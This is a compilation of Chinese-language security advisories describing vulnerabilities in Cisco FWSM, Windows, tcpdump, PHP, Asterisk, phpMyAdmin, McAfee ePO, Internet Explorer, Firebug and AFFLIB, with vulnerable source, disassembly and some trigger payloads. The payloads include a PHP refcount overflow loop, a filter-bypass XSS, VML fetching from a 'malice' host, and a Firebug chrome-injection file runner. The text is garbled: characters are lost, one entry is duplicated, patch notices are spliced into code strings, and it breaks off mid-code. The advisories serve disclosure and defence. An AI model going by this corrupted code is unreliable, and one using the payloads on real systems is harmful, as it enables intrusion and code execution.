必须在足够高的级别启用日志以生成710006系统日志消息，默认下是调试级?7    ?。请注意日志是默认禁用的，Cisco建议仅出于调试和纠错目的在调试级别记    录日志?  这个漏洞在Cisco Bug ID中记录为CSCse85707。处理畸形HTTPS请求可能导致重载+-------------------------------------------------------   如果用户试图访问Web站点且网络管理员配置设备允许网络访问之前认证用户的话?  这个漏洞可能导致FWSM重载。这个功能被称为\"认证网络访问\"或认证代理，可通过   aaa authentication match或aaa authentication include命令启用?  重载实际上是由无效的正常Web浏览器无法生成的特殊HTTPS请求触发的?  这个漏洞在Cisco Bug ID中记录为CSCsg50228。处理超长HTTP请求可能导致重载+-------------------------------------------------------   如果管理员通过aaa authentication match或aaa authentication include命令?  用了\"认证网络访问(auth-proxy)\"的话，这个漏洞也可能导致FWSM重载。但是，   在这种情况下导致重载的HTTP请求是有效的，尽管从所请求URL非常长这个意义来   讲不是正常的请求。Web浏览器在正常的浏览期间可以生成这样的请求?  这个漏洞在Cisco Bug ID中记录为CSCsd91268。处理HTTPS通讯可能导致重载+-------------------------------------------------------   如果FWSM收到了发送给FWSM本身的特定类型HTTPS通讯的话，这个漏洞可能导致FWSM   重载。仅在通过http server enable命令在FWSM上启用了HTTPS服务器的情况下才   会出现这个漏洞，该命令是默认禁用的?    这个漏洞在Cisco Bug ID中记录为CSCsf29974。处理畸形SNMP请求可能导致重载+-------------------------------------------------------   如果从可信任的设备接收了畸形SNMP消息的话，这个漏洞可能导致FWSM重载。必?  通过snmp-server host <interface name> <IP of trusted device>命令对可信任   设备允许明确的SNMP poll访问?  这个漏洞在Cisco Bug ID中记录为CSCse52679?      Microsoft Windows是微软发布的非常流行的操作系统?Windows的CSRSS服务实现上存在设计漏洞，本地攻击者可能利用此漏洞提升自己的权限?从Windows Vista开始使用了一种扩展形式的本地过程调用(LPC)，被称为高级本地过程调用(ALPC)，用于取代旧的LPC与CSRSS进行通讯。每个新的进程都会创建到其会话CSRSS的ApiPort(\Windows\ApiPort或\Sessions\<sessionid>\Windows\ApiPort)的ALPC连接?CSRSS在其服务的会话中维护一个关于进程结构的内部双向链表。引入ALPC后，CSRSS就可以通过使用连接上下文属性中的指针字段将ALPC连接关联到所调用进程相关的进程结构上。但是，CSRSS中很多地方错误的假设进程只会生成一个ApiPort连接，如CSRSRV.DLL!CsrApiRequestThread。每个进程结构中都包含有一个引用计数器，如果创建了新的ALPC连接计数器不会递增，但如果关闭了连接的话可能会递减。因此，攻击者可以创建多个ApiPort连接，然后通过关闭最初的连接释放客户端的进程结构，最后关闭第二个连接或对其执行其他行为，导致错误的重新使用已不存在的进程结构指针?这个漏洞允许攻击者对以释放或已重新分配用于其他用途的内存执行操作。攻击者可以通过关闭第一个连接释放进程结?在Vista中NTDLL.DLL!CsrPortHandle不受保护)，用任意数据替换进程结构之前所占用的堆内存，然后通过关闭第二个连接导致如进程结构那样引用并释放所替换进去的数据。一旦完成了这些操作，CSRSS的执行就会被牵引到攻击者所提供的函数指针上?      Tcpdump是一款免费的网络分析程序，适用于多种Unix操作系统。Tcpdump在处理畸形的IEEE802.11报文时存在堆缓冲区溢出漏洞，远程攻击者可能利用此漏洞在系统上执行任意指令。如果发送了特制?02.11帧的话，就会在IEEE 802.11打印程序中触发单字节堆溢出漏洞。在265行print-802_11.c中的parse_elements()函数检查帧中pbody->tim.length长度中的过小的值，但之后在267行的范围检查中使用了错误的变量。由于pbody->tim.length被定义为u_int8_t，因此可容纳最大值为255，然后将252字节拷贝到了仅有251字节的pbody->tim.bitmap?53    case E_TIM:254        /* Present, possibly truncated */255        pbody->tim_status = TRUNCATED;256        if (!TTEST2(*(p + offset), 2))257            return;258        memcpy(&pbody->tim, p + offset, 2);259        offset += 2;260        if (!TTEST2(*(p + offset), 3))261            return;262        memcpy(&pbody->tim.count, p + offset, 3);263        offset += 3;264265        if (pbody->tim.length <= 3)266            break;267        if (pbody->rates.length > sizeof pbody->tim.bitmap)268            return;269        if (!TTEST2(*(p + offset), pbody->tim.length - 3))270            return;271        memcpy(pbody->tim.bitmap, p + (pbody->tim.length - 3),272            (pbody->tim.length - 3))       PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。PHP的ZVAL结构中引用计数实现上存在整数溢出漏洞，远程攻击者可能利用此漏洞在服务器上执行任意指令。在PHP 4中内部描述变量的ZVAL结构类似于：struct _zval_struct {        /* Variable information */        zvalue_value value;     /* value */        zend_uchar type;        /* active type */        zend_uchar is_ref;        zend_ushort refcount;};在设计这个结构时引用计数器为16位宽，这样在32位系统上整个结构?个字节长；在PHP 5中这个字段为32位宽，因?6位太容易溢出，PHP对引用计数器的溢出也没有内部的防范措施。但对于PHP 4这意味着以下代码会溢出计数器，在脚本端触发变量的双重释放? $var = \"POC\";  for ($i = 0; $i < 0x10001; $i++) {    $arr[] = &$var;  }攻击者可以利用这个漏洞破坏内存，可能执行任意指令，从而绕过disable_functions之类的安全限制。此外由于很多老版本PHP应用程序仍对用户提供的数据使用unserialize()，因此也可能远程触发这个漏洞。Unserialize()函数以不安全的方式使用已还原序列化的__wakeup()方式，可能导致远程执行任意指令?      Asterisk是一款PBX系统的软件，运行在Linux系统上，支持使用SIP、IAX、H323协议进行IP通话。Asterisk在处理畸形结构的报文时存在漏洞，远程攻击者可能利用此漏洞导致服务崩溃。如果攻击者向5060/UDP端口发送的SIP消息在请求行中没有包含URI和SIP版本的话，如REGISTER\r\n <other valid SIP headers>，则Asterisk在处理该消息时会触发空指针引用，导致拒绝服务?      PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。PHP的ZVAL结构中引用计数实现上存在整数溢出漏洞，远程攻击者可能利用此漏洞在服务器上执行任意指令。在PHP 4中内部描述变量的ZVAL结构类似于：struct _zval_struct {        /* Variable information */        zvalue_value value;     /* value */        zend_uchar type;        /* active type */        zend_uchar is_ref;        zend_ushort refcount;};在设计这个结构时引用计数器为16位宽，这样在32位系统上整个结构?个字节长；在PHP 5中这个字段为32位宽，因?6位太容易溢出，PHP对引用计数器的溢出也没有内部的防范措施。但对于PHP 4这意味着以下代码会溢出计数器，在脚本端触发变量的双重释放? $var = \"POC\";  for ($i = 0; $i < 0x10001; $i++) {    $arr[] = &$var;  }攻击者可以利用这个漏洞破坏内存，可能执行任意指令，从而绕过disable_functions之类的安全限制。此外由于很多老版本PHP应用程序仍对用户提供的数据使用unserialize()，因此也可能远程触发这个漏洞。Unserialize()函数以不安全的方式使用已还原序列化的__wakeup()方式，可能导致远程执行任意指令?      phpMyAdmin 2.8.0?.9.2版本的index.php中存在不完全黑名单漏洞。远程攻击者可以通过注入任意的JavaScript或HTML?1)db?2)table参数值，执行跨站脚本攻击。该参数值被uppercase</SCRIPT>结束标识跟随，会绕过对lowercase </script>的保护机制?      FiSH是很多流行的irc客户端所使用的用于实现加密的插件。FiSH的xchat插件实现上存在多个缓冲区溢出漏洞，远程攻击者可能利用这些漏洞控制用户机器。FiSH的xchat插件代码在处理入站数据时会注?个函数：xchat_hook_server(ph, \"PRIVMSG\", XCHAT_PRI_NORM, decrypt_incoming, 0);xchat_hook_server(ph, \"NOTICE\", XCHAT_PRI_NORM, notice_received, 0);xchat_hook_server(ph, \"TOPIC\", XCHAT_PRI_NORM, decrypt_incoming, 0);xchat_hook_server(ph, \"NICK\", XCHAT_PRI_NORM, nick_changed, 0);xchat_hook_server(ph, \"332\", XCHAT_PRI_NORM, decrypt_topic_332, 0);在所有这些函数中：int decrypt_incoming(char *word[], char *word_eol[], void *userdata){unsigned char *msg_ptr, contactName[100]=\"\", from_nick[50], msg_event[100]=\"\",psyNetwork[12];...if(word[1][0] == &#039;:&#039;) ExtractRnick(from_nick, word[1]);...}这里ExtractRnick()执行的是:int ExtractRnick(char *Rnick, char *incoming_msg){int k=0;if(*incoming_msg == &#039;:&#039;) incoming_msg++;while(*incoming_msg!=&#039;!&#039; && *incoming_msg!=0) {Rnick[k]=*incoming_msg;incoming_msg++;k++;}Rnick[k]=0;if (*Rnick < &#039;0&#039;) return FALSE;else return TRUE;}由于word[1]来自用户，因此可能出现栈溢出。其?个函数也存在类似问题：int notice_received(char *word[], char *word_eol[], void *userdata){unsigned int i;unsigned char hisPubKey[300], contactName[25]=\"\", from_nick[25]=\"\";...if(ExtractRnick(from_nick, word[1])==0) return XCHAT_EAT_NONE;...}int nick_changed(char *word[], char *word_eol[], void *userdata){unsigned char contactName[100]=\"\", theKey[500]=\"\", ini_nicktracker[10];...if( *ini_nicktracker==&#039;0&#039; || *ini_nicktracker==&#039;N&#039; || *ini_nicktracker==&#039;n&#039; ||(ExtractRnick(contactName, word[1])==0) ||(stricmp(contactName, word[3]+1)==0))return XCHAT_EAT_NONE;...}int decrypt_topic_332(char *word[], char *word_eol[], void *userdata){unsigned char contactName[100]=\"\";...strcpy(contactName, word[4]);...}       McAfee ePolicy Orchestrator(ePO)是一种业界领先的系统安全管理解决方案，能够帮助企业有效抵御各种恶意威胁和攻击。ePO的SiteManager.Dll ActiveX控件中存在多个缓冲区溢出漏洞，允许远程攻击者完全控制受影响的系统?   1. ExportSiteList()函数栈溢?   InprocServer32?   SiteManager.dll    ClassID?    4124FDF6-B540-44C5-96B4-A380CEE9826A    ProgID?    SiteManager.SiteMgr.1    函数名：     ExportSiteList    如果将ExportSiteList参数设置为超长字符串，就会触发栈溢出，相关代码如下：    (SiteManager.dll,version=3.6.1.166)    .text:5262B1DE ; func_ExportSiteList    .text:5262B1DE ; Attributes: bp-based frame    .text:5262B1DE    .text:5262B1DE ; int __stdcall sub_5262B1DE(int,wchar_t *,int)    .text:5262B1DE sub_5262B1DE    proc near            ; DATA XREF: .rdata:5265B504 o    .text:5262B1DE                            ; .rdata:5265B614 o    .text:5262B1DE    .text:5262B1DE var_414         = word ptr -414h    .text:5262B1DE var_20E         = word ptr -20Eh    .text:5262B1DE var_20C         = word ptr -20Ch    .text:5262B1DE var_4           = dword ptr -4    .text:5262B1DE arg_0           = dword ptr  8    .text:5262B1DE arg_4           = dword ptr  0Ch    .text:5262B1DE arg_8           = dword ptr  10h    .text:5262B1DE    .text:5262B1DE                 push    ebp    .text:5262B1DF                 mov     ebp, esp    .text:5262B1E1                 sub     esp, 414h    .text:5262B1E7                 mov     eax, dword_52670218    ; set stack cookie    .text:5262B1EC                 push    esi    .text:5262B1ED                 push    [ebp+arg_4]        ; lpSrcBuff    .text:5262B1F0                 mov     [ebp+var_4], eax    .text:5262B1F3                 lea     eax, [ebp+var_20C]    .text:5262B1F9                 push    eax            ; lpDestBuff    .text:5262B1FA                 call    ds:wcscpy        ; stack overflow2. 以下swprintf函数未经验证便执行了拷贝操作?   .text:5262B257                 push    ebx    .text:5262B258                 push    edi    .text:5262B259                 mov     edi, offset aSitelist_xml ; \"SiteList.xml\"    .text:5262B25E                 push    edi    .text:5262B25F                 lea     eax, [ebp+var_20C]    .text:5262B265                 push    eax    .text:5262B266                 lea     eax, [ebp+var_414]    .text:5262B26C                 push    offset aSS_0        ; \"目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"https://mysupport.mcafee.com/eservice_enu/start.swe\" target=\"_blank\" rel=\"nofollow\">https://mysupport.mcafee.com/eservice_enu/start.swe</a>\\\"    .text:5262B271                 push    eax            ; lpSrcBuff    .text:5262B272                 call    ds:swprintf        ; stack overflow3. VerifyPackageCatalog()函数栈溢?   InprocServer32?   SiteManager.dll    ClassID?    4124FDF6-B540-44C5-96B4-A380CEE9826A    ProgID?    SiteManager.SiteMgr.1    函数名：     VerifyPackageCatalog    如果将VerifyPackageCatalog参数设置为超长字符串，就会触发栈溢出，相关代码如下：    (SiteManager.dll,version=3.6.1.166)    part1:    .text:5262CFAC func_VerifyPackageCatalog proc near        .text:5262CFAC                            .text:5262CFAC           mov     eax, offset loc_52649F86    .text:5262CFB1           call    __EH_prolog    ...    .text:5262D00C           lea     eax, [ebp-28h]    .text:5262D00F           push    eax    .text:5262D010           push    ebx    .text:5262D011           push    esi    .text:5262D012           push    offset loc_5263AD1A    .text:5262D017           push    ebx    .text:5262D018           push    ebx    .text:5262D019           call    ds:_beginthreadex    part2:    .text:5263AD1A           mov     eax, offset loc_5264B221    .text:5263AD1F           call    __EH_prolog    .text:52637229           push    ecx    .text:5263722A           mov     eax, 1774h    .text:5263722F           call    __alloca_probe                ; int    .text:52637234           mov     eax, dword_52670218    .text:52637239           mov     [ebp-14h], eax                ; set stack-cookie    ...    .text:5263AD9A           lea     ecx, [ebp-23Ch]    .text:5263ADA0           push    ecx    .text:5263ADA1           push    eax    .text:5263ADA   Microsoft Windows是微软发布的非常流行的操作系统。Microsoft Windows的NDISTAPI.sys驱动实现机制上存在漏洞，本地攻击者可能利用此漏洞对系统执行拒绝服务攻击。Windows的NDISTAPI.sys驱动是内核态组件，但允许非特权用户的访问，因此任意用户态应用程序都可以向这个设备写入数据：Ndistapi.sysWindows XP SP2_; __stdcall NdisTapiDispatch(x, x).text:000115E8 _NdisTapiDispatch@8 proc near           ; DATA XREF:DriverEntry(x,x)+13E#o.text:000115E8.text:000115E8 arg_4           = dword ptr  0Ch.text:000115E8.text:000115E8                 push    ebp.text:000115E9                 mov     ebp, esp.text:000115EB                 push    ebx.text:000115EC                 push    esi.text:000115ED                 mov     esi, [ebp+arg_4].text:000115F0                 mov     eax, [esi+60h].text:000115F3                 movzx   ecx, byte ptr [eax].text:000115F6                 sub     ecx, 0.text:000115F9                 mov     edx, [esi+0Ch].text:000115FC                 mov     ebx, [eax+4].text:000115FF                 push    edi.text:00011600                 mov     edi, [eax+8].text:00011603                 jz      short loc_1167E.text:00011605                 dec     ecx.text:00011606                 dec     ecx.text:00011607                 jz      short loc_11674.text:00011609                 sub     ecx, 0Ch.text:0001160C                 jnz     loc_11697.text:00011612                 mov     eax, [eax+0Ch].text:00011615                 cmp     eax, 8FFF23C0h  ;IOCTL.text:0001161A                 jz      short loc_11669 ;DoIoctlConnectWork().text:0001161C                 cmp     eax, 8FFF23C8h.text:00011621                 jz      short loc_1165C{...}.text:00010B16 ; __stdcall DoIoctlConnectWork(x, x, x, x).text:00010B16 _DoIoctlConnectWork@16 proc near        ; CODE XREF:NdisTapiDispatch(x,x)+85#p.text:00010B16.text:00010B16 arg_0           = dword ptr  4.text:00010B16 arg_4           = dword ptr  8.text:00010B16 arg_8           = dword ptr  0Ch.text:00010B16 arg_C           = dword ptr  10h.text:00010B16.text:00010B16                 mov     ecx, _DeviceExtension.text:00010B1C                 push    edi.text:00010B1D                 mov     edi,ds:__imp_@KfAcquireSpinLock@4 ; KfAcquireSpinLock(x).text:00010B23                 add     ecx, 4Ch.text:00010B26                 call    edi ; KfAcquireSpinLock(x) ;<=FLAW KfAcquireSpinLock(x).text:00010B28                 cmp     [esp+4+arg_8], 8  ;InputBuffer length.text:00010B2D                 mov     dl, al.text:00010B2F                 jb      loc_10BC5.text:00010B35                 cmp     [esp+4+arg_C], 4  ;OutputBufferlength.text:00010B3A                 jb      loc_10BC5.text:00010B40                 mov     ecx, _DeviceExtension.text:00010B46                 cmp     dword ptr [ecx+4], 1.text:00010B4A                 push    ebx.text:00010B4B                 mov     ebx, [esp+8+arg_4].text:00010B4F                 push    esi.text:00010B50                 mov     esi,ds:__imp_@KfReleaseSpinLock@8 ; KfReleaseSpinLock(x,x).text:00010B56                 jnz     short loc_10B8D.text:00010B58                 mov     dword ptr [ecx+4], 2.text:00010B5F                 mov     ecx, _DeviceExtension.text:00010B65                 mov     eax, [ebx].text:00010B67                 mov     [ecx+10h], eax.text:00010B6A                 mov     ecx, _DeviceExtension.text:00010B70                 add     ecx, 4Ch.text:00010B73                 call    esi ; KfReleaseSpinLock(x,x) ;KfReleaseSpinLock(x,x)[---].text:00010BC5.text:00010BC5 loc_10BC5:.text:00010BC5.text:00010BC5                 mov     eax, 0C0000023h  ; ERROR CODE.text:00010BCA                 xor     ecx, ecx.text:00010BCC.text:00010BCC loc_10BCC:.text:00010BCC                 mov     edx, [esp+4+arg_0].text:00010BD0                 mov     [edx+18h], eax.text:00010BD3                 mov     [edx+1Ch], ecx.text:00010BD6                 pop     edi.text:00010BD7                 retn    10h              ; Return可见这个例程将IRQL提升到DISPATCH级别，在检查长度之前要求spinlock，之后如果所提供的大小无效的话，例程没有释放所获得的spinlock便返回，因此即使返回到Ring3之后IRQL仍在该线程的DISPATCH级?最终的结果是用户态线程以DISPATCH级运行   Network Audio System是一款网络音频传输系统。Network Audio System中ProcAuSetElements中过大的num_actions导致无效的内存指针在ProcAuSetElements中num_actions用于增量stuff缓冲区中el架构的指针。如果客户端发送了一个或多个很大的num_action值的话，就会强制服务器使用stuff缓冲区外的数据，导致崩溃。server/dia/audispatch.c文件中的漏洞代码?define ADD_VAR(n)                                                            \{                                                                             \    AuUint8 *_t = (AuUint8 *) el;                                             \                                                                              \    varLen += (n);                                                            \    _t += (n);                                                                \    el = (auElement *) _t;                                                    \}#define COMP_ACTIONS(num)                                                      \{                                                                              \    numActions += (num) ? (num) : numDefaultActions[el->type];                 \    ADD_VAR((num) * sizeof(auElementAction));                                  \}...intProcAuSetElements(ClientPtr client){fprintf(stderr, \"XXX ProcAuSetElements\n\");    REQUEST(auSetElementsReq);    FlowPtr flow;    int len, i, varLen, numActions, status;    auElement *el;    ...    el = (auElement *) & stuff[1];    /* compute length of variable data and do some error checking */    for (i = varLen = numActions = 0; i < stuff->numElements; i++, el++)        switch (el->type) {        case AuElementTypeImportClient:            COMP_ACTIONS(el->importclient.actions.num_actions);            ...       \"Internet Explorer是微软发布的非常流行的WEB浏览器?IE的VML在处理畸形格式的GZIP压缩文件时存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制用户系统?VGX.DLL是IE中负责渲染VML的组件，该组件中的CDownloadSink类实现处理从VML中内嵌URL所下载的数据。例如，以下VML会下载由VGX.DLL!CDownloadSink::OnDataAvailable处理的额外内容：<v:rect><v:imagedata src=\"\"\" target=\"\"_blank\"\">http://malice/compressed.emz\"></v:rect>VGX.DLL!CDownloadSink::OnDataAvailable函数在计算读取长度限制时存在整数溢出漏洞，最终会导致URLMON.DLL!CMimeFt::SmartRead函数在后续的处理中溢出堆缓冲区。传送到CDownloadSink::OnDataAvailable的第二个参数([EBP+10h])是接收到的压缩文件数据的长度，但函数在计算将要传送给URLMON.DLL!CReadOnlyStreamDirect::Read的读取限制时会从压缩文件数据长度减去缓冲区中非压缩数据的长度。如果未压缩的数据大于压缩文件数据总长的话，就会出现整数下溢，导致将很大的?大约4GB)用作读取限制。如果后续读取的数据长度超过了缓冲区中未使用空间的升序，就会导致堆溢出?利用这个漏洞要求至少调用两次CDownloadSink::OnDataAvailable，一次用一些非0字节长度的未压缩数据加载缓冲区，另一次导致溢出，因此必须分别独立的接收压缩数据。但这种接收数据的方式可能是合法的，因此即使合法的站点也可能触发非恶意的堆溢出。\"       PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中?PHP的imap_mail_compose()函数实现上存在缓冲区溢出漏洞，本地攻击者可能利用此漏洞提升权限?imap_mail_compose()函数在名为tmp的栈缓冲区中创建固定大小的多部邮件：PHP_FUNCTION(imap_mail_compose){    ...    char tmp[8 * MAILTMPLEN], *mystring=NULL, *t=NULL, *tempstring=NULL;在创建多部消息时首先要从输入参数中读取BOUNDARY，然后未经任何大小检查便使用sprintf调用将输入参数拷贝到了栈缓冲区：    if (bod && bod->type == TYPEMULTIPART) {        /* first body part */            part = bod->nested.part;        /* find cookie */            for (param = bod->parameter; param && !cookie; param = param->next) {                if (!strcmp (param->attribute, \"BOUNDARY\")) {                    cookie = param->value;                }            }        /* yucky default */            if (!cookie) {                cookie = \"-\";            }        /* for each part */            do {                t=tmp;            /* build cookie */                sprintf (t, \"--目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://www.php.net\" target=\"_blank\" rel=\"nofollow\">http://www.php.net</a>\", cookie, CRLF);这允许覆盖缓冲区，导致执行任意指令?       FireBug是一个非常实用的JavaScript以及DOM查看调试工具，是Firefox的一个插件?FireBug的对脚本代码的处理实现上存在漏洞，远程攻击者可能利用此漏洞在用户机器上执行恶意脚本代码?在浏览器中远程脚本是受到沙盒限制的，也就是任何http:或https:前缀的URL都是安全的。浏览器扩展使用chrome: protocol，这个协议不受任何限制，因此浏览器扩展都是受信任的。如果远程脚本诱骗浏览器对chrome:执行JavaScript表达式的话，这个脚本就可以完全控制整个chrome及操作系统，因为命令执行和读写访问都是允许的?如果要导致Firebug执行跨站脚本，可执行以下操作?console.log({&#039;<script>alert(\"bing!\")</script>&#039;:&#039;exploit&#039;})如果将这段JavaScript表达式嵌入到页面并使用安装了Firebug的浏览器打开，用户就会得到一个警告窗，这时攻击者可以向浏览器chrome中注入以下函数：function runFile(f) {        var file = Components.classes[\"@mozilla.org/file/local;1\"]                .createInstance(Components.interfaces.nsILocalFile);        file.initWithPath(f);        var process = Components.classes[\"@mozilla.org/process/util;1\"]                .createInstance(Components.interfaces.nsIProcess);        process.init(file);        var argv = Array.prototype.slice.call(arguments, 1);        process.run(true, argv, argv.length);}runFile函数允许执行文件。通过浏览器chrome中的函数声明，攻击者就可以多次调用console.log以生成任意文件，甚至暗中安装浏览器扩展，以及读写文件?      AFFLIB是用于操作高级取证格?AFF)文件的开源函数库?AFFLIB中存在多个缓冲区溢出漏洞，可能允许攻击者导致取证查看器拒绝服务或执行任意指令?具体漏洞如下?* LastModified远程栈溢?*文件：lib/s3.cpp行数?13LastModified字符串通过strcpy(3)拷贝到了固定长度的缓冲区，但最初从XML响应读取字符串时没有执行长度检查，允许恶意的Amazon S3服务器或中间人在S3客户端系统上执行任意指令?11-115行说明了这个问题?  /* Make date nice */  char tstamp[64];  strcpy(tstamp,(*i)->LastModified.c_str());  tstamp[10] = &#039; &#039;;  tstamp[19] = &#039;\000&#039;;(*i)->LastModified字符串是直接从endElement()回调函数(lib/s3_glue.cpp?73-178?的XML响应中获得的? case 3:  if(!strcmp(name,\"Key\")){    einfo->lbr->contents.back()->Key = einfo->cbuf; break;}  if(!strcmp(name,\"LastModified\")){einfo->lbr->contents.back()->LastModified = einfo->cbuf;break;}  if(!strcmp(name,\"ETag\")){   einfo->lbr->contents.back()->ETag = einfo->cbuf;break;}  if(!strcmp(name,\"Size\")){   einfo->lbr->contents.back()->Size = atoi(einfo->cbuf.c_str());break;}  break;成功攻击要求用户对不可信任的S3服务器运行s3二进制程序，或攻击者能够对用户和有效的S3服务器之间的通讯执行扮演或中间人攻击?* S3 URL解析栈溢?*文件：lib/vnode_s3.cpp行数?0  & 81memcpy()调用中不可信任的参数未经长度检查拷贝到了栈缓冲区，如果这个函数接收了不可信任来源的URL，就会导致代码执行?6-81行说明了这个问题?    /* Separate out the bucket and the path */    const char *fn = af_filename(af);    regex_t re;    if(regcomp( &re,\"^s3://([^/]*)/(.*)$\",REG_EXTENDED)){    err(1,\"regcomp\");    }    regmatch_t match[3];    memset(match,0,sizeof(match));    if(regexec( &re,fn,3,match,0)!=0){    return -1; // can&#039;t parse URL; must not be a match    }    char bucket[1024]; memset(bucket,0,sizeof(bucket));    char path[1024];   memset(path,0,sizeof(path));    memcpy(bucket,fn+match[1].rm_so,match[1].rm_eo-match[1].rm_so);    memcpy(path,fn+match[2].rm_so,match[2].rm_eo-match[2].rm_so);对memcpy()指定的长度是正则表达式的长度，而没有考虑路径缓冲区的大小，如果攻击者能够向特权aimage程序或通过其他第三方程序传送命令行参数的话就可以触发这个溢出?* libewf Vnode Wrapper栈溢?*文件：lib/vnode_ewf.cpp行数?0strcpy()调用中不可信任的参数未经长度检查拷贝到了栈缓冲区。如果这个命令接收到了不可信任来源的参数，就可能导致代码执行?9-70行说明了这个问题?static int ewf_open(AFFILE *af){    if(strchr(af->fname,&#039;.&#039;)==0) return -1; // need a &#039;.&#039; in the filename    /* See how many files there are to open */    char **files = (char **)malloc(sizeof(char *));    int nfiles = 1;    files[0] = strdup(af->fname);    char fname[MAXPATHLEN+1];    strcpy(fname,af->fname);af->fname字符串是由用户提供的，且不受MAXPATHLEN限制?* AFD Vnode Wrapper栈溢?*文件：lib/vnode_afd.cpp行数?05strcpy()调用没有经过长度检查便将不可信任的参数写入到栈缓冲区。如果这个命令接收到了不可信任来源的参数，就可能导致任意指令执行?02-412行说明了这个问题?    while ((dp = readdir(dirp)) != NULL){    if (last4_is_aff(dp->d_name)){        char path[MAXPATHLEN+1];            strcpy(path,af->fname);                strlcat(path,\"/\",sizeof(path));                    strlcat(path,dp->d_name,sizeof(path));                        if(afd_add_file(af,path)){                            return -1;                                    }                                    }    }如果用户对af->fname指定的值大?025字节的话就会触发这个溢出。这个长度是可以接受的，因为很多系统都允许最大为4096字节的路径名?* aimage Input File Name栈溢?*文件：aimage/aimage.cpp行数?54sprintf()调用没有经过长度检查便将命令行参数写入到了栈缓冲区。如果这个命令接收到了不可信任来源的参数，就可能导致任意指令执行?48-554行说明了这个问题? int getlock(class imager *im) {    /* If the file exists and the PID in the file is running,     * can&#039;t get the lock.     */    char lockfile[MAXPATHLEN];    sprintf(lockfile,\"/tmp/aimge.目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载?<a href=\"http://www.afflib.org/downloads/afflib-2.2.8.tar.gz\" target=\"_blank\" rel=\"nofollow\">http://www.afflib.org/downloads/afflib-2.2.8.tar.gz</a>.lock\",im->infile);如果aimage二进制程序为setuid/setgid，或在CGI脚本中执行aimage程序，攻击者就可以利用这个漏洞?       AFFLIB是用于操作高级取证格?AFF)文件的开源函数库?AFFLIB的一些命令行工具实现上存在格式串处理漏洞，本地攻击者可能利用此漏洞提升自己的权限?这些工具以格式串参数向warn()和err()调用传输一些命令行参数。如果攻击者能够影响这些命令行参数的话，就可能导致执行任意指令?* s3格式串注?*文件：lib/s3.cpp行数?07err()调用中的一个命令行参数用作了格式串，如果攻击者能够影响名称的话就可以导致格式串注入漏洞?92-207行说明了这个问题? void s3_cp(const char *fname,string key) {    struct s3headers meta[2] = {{0,0},{0,0}};    char buf[64];    if(opt_flag){    snprintf(buf,sizeof(buf),\"%d\",opt_flag);    meta[0].name = AMAZON_METADATA_PREFIX \"arg\";    meta[0].value = buf;    }    /* Read from fname into a buffer.     * Note that we do this with read, so that we can read from stdin     */    FILE *f = fopen(fname,\"r\");    if(!f) err(1,fname);如果s3二进制程序为setuid/setgid，或s3程序在CGI脚本中执行的话，攻击者就可以利用这个漏洞?* afconvert格式串注?*文件：tools/afconvert.cpp行数?26?63?053个err()调用中的一个命令行参数用作了格式串，如果攻击者能够影响名称的话就可以导致格式串注入漏洞?* afcopy格式串注?*文件：tools/afcopy.cpp行数?02?502个err()调用中的一个命令行参数用作了格式串，如果攻击者能够影响名称的话就可以导致格式串注入漏洞?* afinfo格式串注?*文件：tools/afinfo.cpp行数?84err()调用中的一个命令行参数用作了格式串，如果攻击者能够影响名称的话就可以导致格式串注入漏洞? aimage格式串注?*文件：aimage/aimage.cpp行数?77err()调用中的一个命令行参数用作了格式串，如果攻击者能够影响名称的话就可以导致格式串注入漏洞?48-577行说明了这个问题? int getlock(class imager *im) {    /* If the file exists and the PID in the file is running,     * can&#039;t get the lock.     */    char lockfile[MAXPATHLEN];    sprintf(lockfile,\"/tmp/aimge.目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://www.afflib.org/index.php\" target=\"_blank\" rel=\"nofollow\">http://www.afflib.org/index.php</a>.lock\",im->infile);    if(access(lockfile,F_OK)==0){    /* Lockfile exists. Get it&#039;s pid */    char buf[1024];    FILE *f = fopen(lockfile,\"r\");    if(!f){        perror(lockfile);        // can&#039;t read lockfile...            return -1;            }            fgets(buf,sizeof(buf),f);            buf[sizeof(buf)-1] = 0;            int pid = atoi(buf);            if(checkpid(pid)==0){                /* PID is not running; we can delete the lockfile */                    if(unlink(lockfile)){                        err(1,\"could not delete lockfile : \",lockfile);                            }                            }                            /* PID is running; generate error */                            errx(1,\" is locked by process %d\n\",im->infile,pid);    }    FILE *f = fopen(lockfile,\"w\");    if(!f){    err(1,lockfile);由于用户可以指定im->infile值，因此lockfile字符串可能包含有格式串字符。如果aimage二进制程序为setuid/setgid或aimage程序在CGI脚本中执行的话，就可能导致这个漏洞?* imager格式串注?*文件：aimage/imager.cpp行数?65err()调用中的一个命令行参数用作了格式串，如果攻击者能够影响名称的话就可以导致格式串注入漏洞?* afxml格式串注?*文件：tools/afxml.cpp行数?01err()调用中的一个命令行参数用作了格式串，如果攻击者能够影响户名称的话就可以导致格式串注入漏洞?       AFFLIB是用于操作高级取证格?AFF)文件的开源函数库?AFFLIB的一些popen()调用未经验证或转义便使用了用户提供的命令行参数，本地攻击者可能利用这些漏洞提升权限?具体漏洞如下?* 解压调用Shell命令注入 *文件：tools/afconvert.cpp行数?45  & 255popen()调用未经验证或转义便使用了一个命令行参数，如果这个命令或这个函数接受了不可信任来源的参数，就可能导致执行任意命令?40-257行说明了这个问题?    /* Check to see if it is a gzip file... */    if(probe_gzip(infile)        & & yesno(\"infile looks like a gzip file\",\"Uncompress it\",\"Uncompressing\")){       /* Open with a subprocess. We will need to use zlib when we move to Windows. */       char buf[256];       sprintf(buf,\"gzcat 目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://www.afflib.org/index.php\" target=\"_blank\" rel=\"nofollow\">http://www.afflib.org/index.php</a>\",infile);       a_in = af_popen(buf,\"r\");    }    /* Check to see if it is a bzip2 file... */    if(!a_in        & & probe_bzip2(infile)        & & yesno(\"infile looks like a bzip2 file\",\"Uncompress it\",\"Uncompressing\")){       /* Open with a subprocess. We will need to use bzip2zlib when we move to Windows. */       char buf[256];       sprintf(buf,\"bzcat \",infile);       a_in = 